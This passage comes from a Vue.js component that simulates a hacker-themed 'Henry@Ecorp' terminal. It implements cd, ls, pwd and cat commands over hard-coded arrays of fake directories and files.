            searchArr = this.$data.dirHRFormDraftsArr;
            accessArr = this.$data.dirHRFormDraftsAcc;
            classArr = this.$data.dirHRFormDraftsClass;
          } else if (
            this.$data.tempDirName.toLowerCase() === "data" &&
            this.$data.parentDirName.toLowerCase() === "tools"
          ) {
            searchArr = this.$data.dirToolsDataArr;
            accessArr = this.$data.dirToolsDataAcc;
            classArr = this.$data.dirToolsDataClass;
          } else if (this.$data.tempDirName.toLowerCase() === "tools") {
            searchArr = this.$data.dirToolsArr;
            accessArr = this.$data.dirToolsAcc;
            classArr = this.$data.dirToolsClass;
          } else if (this.$data.tempDirName.toLowerCase() === "home") {
            searchArr = this.$data.dirHomeDirArr;
            accessArr = this.$data.dirHomeDirAcc;
            classArr = this.$data.dirHomeDirClass;
          } else if (this.$data.tempDirName.toLowerCase() === "tmp") {
            searchArr = this.$data.dirTmpArr;
            accessArr = this.$data.dirTmpAcc;
            classArr = this.$data.dirTmpClass;
          }

          for (let iCount = 0; iCount < searchArr.length; iCount++) {
            if (searchArr[iCount].toLowerCase() === searchValue) {
              exist = true;
              if (accessArr[iCount] === 1) {
                accessAllowed = true;
              }
              if (classArr[iCount] !== 0) {
                directory = true;
              }
            }
          }

          if (exist) {
            if (directory) {
              if (accessAllowed) {
                if (this.$data.tempDirName === "/") {
                  this.$data.dir =
                    this.$data.parentDirName + this.$data.newDirName;
                } else {
                  this.$data.dir =
                    this.$data.parentDirName +
                    "/" + // Parent folder
                    this.$data.tempDirName +
                    "/" + // Current folder
                    this.$data.newDirName; // New directory where we go
                }

                if (this.$data.newDirName.toLowerCase() === "henry") {
                  this.$data.banner.sign = `Henry@Ecorp:~#`;
                } else
                  this.$data.banner.sign = `Henry@Ecorp:/~${
                    this.$data.newDirName
                  }#`;
              } else
                this.send_to_terminal = `<p style="color:red;">[ERROR] You don't have permission to access this directory</p>`;
            } else
              this.send_to_terminal = `<p style="color:red;">[ERROR] You can't cd to file</p>`;
          } else {
            this.send_to_terminal = `<p style="color:red;">[ERROR] File or directory "${
              this.$data.newDir
            }" not found</p>`;
          }

          this.$data.newDir = undefined;
        } else if (
          this.$data.newDir === ".." &&
          this.$data.parentDirName !== undefined
        ) {
          this.send_to_terminal = this.$data.parentDirName;
          if (this.$data.parentDirName.toLowerCase() === "henry") {
            this.$data.banner.sign = `Henry@Ecorp:~#`;
            this.$data.dir = "/home/henry";
          } else {
            this.$data.banner.sign = `Henry@Ecorp:~${
              this.$data.parentDirName
            }#`;
            this.$data.dir = this.$data.dir.slice(
              0,
              this.$data.dir.lastIndexOf("/")
            );
            if (this.$data.dir === "") {
              this.$data.dir = "/";
            }
          }
        } else if (this.$data.newDir === undefined) {
          this.$data.banner.sign = "Henry@Ecorp:~#";
          this.$data.dir = "/home/henry";
        } else {
          this.send_to_terminal = `<p style="color:red;">[ERROR] File or directory "${
            this.$data.newDir
          }" not found</p>`;
        }
      }
      // ls commands
      else if (
        value
          .trim()
          .toLowerCase()
          .match(/[^\s]+/g)[0] === "ls"
      ) {
        let files = [[]];
        let classification = [[]];
        let currDir = "";
        let parentDir = "";

        if (this.$data.dir !== "/") {
          currDir = this.$data.dir
            .split("\\")
            .pop()
            .split("/")
            .pop();
        } else currDir = this.$data.dir;

        parentDir = this.$data.dir
          .slice(0, this.$data.dir.lastIndexOf("/"))
          .split("\\")
          .pop()
          .split("/")
          .pop();

        if (currDir.toLowerCase() === "henry") {
          files = this.$data.dirHomeArr;
          classification = this.$data.dirHomeClass;
        } else if (currDir === "/") {
          files = this.$data.dirRootArr;
          classification = this.$data.dirRootClass;
        } else if (
          currDir.toLowerCase() === "data" &&
          parentDir.toLowerCase() === "henry"
        ) {
          files = this.$data.dirDataArr;
          classification = this.$data.dirDataClass;
        } else if (
          currDir.toLowerCase() === "documents" &&
          parentDir.toLowerCase() === "henry"
        ) {
          files = this.$data.dirDocumentsArr;
          classification = this.$data.dirDocumentsClass;
        } else if (
          currDir.toLowerCase() === "desktop" &&
          parentDir.toLowerCase() === "henry"
        ) {
          files = this.$data.dirDesktopArr;
          classification = this.$data.dirDesktopClass;
        } else if (
          currDir.toLowerCase() === "hr_form_drafts" &&
          parentDir.toLowerCase() === "desktop"
        ) {
          files = this.$data.dirHRFormDraftsArr;
          classification = this.$data.dirHRFormDraftsClass;
        } else if (
          currDir.toLowerCase() === "data" &&
          parentDir.toLowerCase() === "tools"
        ) {
          files = this.$data.dirToolsDataArr;
          classification = this.$data.dirToolsDataClass;
        } else if (currDir.toLowerCase() === "tools") {
          files = this.$data.dirToolsArr;
          classification = this.$data.dirToolsClass;
        } else if (currDir.toLowerCase() === "home") {
          files = this.$data.dirHomeDirArr;
          classification = this.$data.dirHomeDirClass;
        } else if (currDir.toLowerCase() === "tmp") {
          files = this.$data.dirTmpArr;
          classification = this.$data.dirTmpClass;
        }

        for (let iCount = 0; iCount < files.length; iCount++) {
          if (classification[iCount] === 0) {
            td += "<p>" + files[iCount] + "</p>";
          } else if (classification[iCount] === 1) {
            td += "<p style='color:#838383;'>" + files[iCount] + "</p>";
          } else if (classification[iCount] === 2) {
            td += "<p style='color:green;'>" + files[iCount] + "</p>";
          } else if (classification[iCount] === 3) {
            td +=
              "<p style='color:#151515;background-color:green;width:30px;'>" +
              files[iCount] +
              "</p>";
          }
        }
        this.send_to_terminal = td;
      }

      // other commands
      else if (value.trim().toLowerCase() === "pwd") {
        this.send_to_terminal = this.$data.dir;
      } else if (
        value
          .trim()
          .toLowerCase()
          .match(/[^\s]+/g)[0] === "cat"
      ) {
        let exist = false;
        let file = false;
        let accessAllowed = false;
        let searchArr = [];
        let accessArr = [];
        let classArr = [];

        let searchValue = value
          .trim()
          .toLowerCase()
          .match(/[^\s]+/g)[1];

        if (this.$data.dir !== "/") {
          this.$data.tempDirName = this.$data.dir
            .split("\\")
            .pop()
            .split("/")
            .pop();
        } else this.$data.tempDirName = "/";

        if (this.$data.dir !== "/") {
          this.$data.parentDirName = this.$data.dir
            .slice(0, this.$data.dir.lastIndexOf("/"))
            .split("\\")
            .pop()
            .split("/")
            .pop();
        } else this.$data.parentDirName = "/";

        if (this.$data.tempDirName.toLowerCase() === "henry") {
          searchArr = this.$data.dirHomeArr;
          accessArr = this.$data.dirHomeAcc;
          classArr = this.$data.dirHomeClass;
        } else if (this.$data.tempDirName === "/") {
          searchArr = this.$data.dirRootArr;
          accessArr = this.$data.dirRootAcc;
          classArr = this.$data.dirRootClass;
        } else if (
          this.$data.tempDirName.toLowerCase() === "data" &&
          this.$data.parentDirName.toLowerCase() === "henry"
        ) {
          searchArr = this.$data.dirDataArr;
          accessArr = this.$data.dirDataAcc;
          classArr = this.$data.dirDataClass;
        } else if (
          this.$data.tempDirName.toLowerCase() === "documents" &&
          this.$data.parentDirName.toLowerCase() === "henry"
        ) {
          searchArr = this.$data.dirDocumentsArr;
          accessArr = this.$data.dirDocumentsAcc;
          classArr = this.$data.dirDocumentsClass;
        } else if (
          this.$data.tempDirName.toLowerCase() === "desktop" &&
          this.$data.parentDirName.toLowerCase() === "henry"
        ) {
          searchArr = this.$data.dirDesktopArr;
          accessArr = this.$data.dirDesktopAcc;
          classArr = this.$data.dirDesktopClass;
        } else if (
          this.$data.tempDirName.toLowerCase() === "hr_form_drafts" &&
          this.$data.parentDirName.toLowerCase() === "desktop"
        ) {
          searchArr = this.$data.dirHRFormDraftsArr;
          accessArr = this.$data.dirHRFormDraftsAcc;
          classArr = this.$data.dirHRFormDraftsClass;
        } else if (
          this.$data.tempDirName.toLowerCase() === "data" &&
          this.$data.parentDirName.toLowerCase() === "tools"
        ) {
          searchArr = this.$data.dirToolsDataArr;
          accessArr = this.$data.dirToolsDataAcc;
          classArr = this.$data.dirToolsDataClass;
        } else if (this.$data.tempDirName.toLowerCase() === "tools") {
          searchArr = this.$data.dirToolsArr;
          accessArr = this.$data.dirToolsAcc;
          classArr = this.$data.dirToolsClass;
        } else if (this.$data.tempDirName.toLowerCase() === "home") {
          searchArr = this.$data.dirHomeDirArr;
          accessArr = this.$data.dirHomeDirAcc;
          classArr = this.$data.dirHomeDirClass;
        } else if (this.$data.tempDirName.toLowerCase() === "tmp") {
          searchArr = this.$data.dirTmpArr;
          accessArr = this.$data.dirTmpAcc;
          classArr = this.$data.dirTmpClass;
        }

        for (let iCount = 0; iCount < searchArr.length; iCount++) {
          if (searchArr[iCount].toLowerCase() === searchValue) {
            exist = true;
            if (accessArr[iCount] === 1) {
              accessAllowed = true;
            }
            if (classArr[iCount] === 0) {
              file = true;
            }
          }
        }

        if (exist) {
          if (file) {
            if (accessAllowed) {
              // PRINT FILENAME INFO
              this.send_to_terminal = `${searchValue} full data.`;
            } else
              this.send_to_terminal = `<p style="color:red;">[ERROR] You don't have permission to access this directory</p>`;
          } else
            this.send_to_terminal = `<p style="color:red;">[ERROR] You can't cat directory</p>`;
        } else {
          this.send_to_terminal = `<p style="color:red;">[ERROR] File or directory "${
            this.$data.newDir
          }" not found</p>`;
        }
      } else {
        this.send_to_terminal = `'${value}' is not recognized as an internal command or external,
an executable program or a script`;
      }
    }
  }
};
</script>

<style>
</style>